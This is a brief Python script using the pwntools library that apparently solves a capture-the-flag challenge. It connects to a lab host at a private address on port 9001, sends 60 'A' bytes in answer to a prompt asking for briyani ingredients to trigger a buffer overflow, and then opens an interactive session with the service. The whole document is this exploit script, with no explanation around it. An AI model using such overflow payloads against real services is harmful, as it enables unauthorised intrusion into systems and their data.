from pwn import *
r = remote('10.10.78.140', 9001)
payload = b'A'*60
r.sendlineafter(b"Type the required ingredients to make briyani: ", payload)
r.interactive()
